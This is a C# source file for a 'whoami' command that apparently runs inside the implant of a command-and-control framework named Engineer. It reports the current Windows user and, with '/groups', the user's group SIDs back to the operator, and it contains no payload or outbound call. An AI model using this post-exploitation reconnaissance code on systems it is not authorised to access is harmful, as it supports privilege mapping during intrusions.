using Engineer.Commands;
using Engineer.Functions;
using Engineer.Models;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Security.Principal;
using System.Text;
using System.Threading.Tasks;

namespace Engineer.Commands
{
    internal class WhoAmI : EngineerCommand
    {
        public override string Name => "whoami";

        public override async Task Execute(EngineerTask task)
        {
            try
            {
                var identity = WindowsIdentity.GetCurrent();
                string Username = identity.Name;
                if (task.Arguments != null)
                {
                    if (task.Arguments.ContainsKey("/groups"))
                    {
                        var groups = identity.Groups;
                        var groupNames = groups.Select(g => g.Value);
                        Tasking.FillTaskResults($"{Username} is a member of the following groups: {string.Join(", ", groupNames)}", task, EngTaskStatus.Complete, TaskResponseType.String);
                    }
                }
                Tasking.FillTaskResults($"{Username}", task, EngTaskStatus.Complete, TaskResponseType.String);
            }
            catch (Exception ex)
            {
                Tasking.FillTaskResults(ex.Message, task, EngTaskStatus.Failed, TaskResponseType.String);
            }
            
        }
    }
}
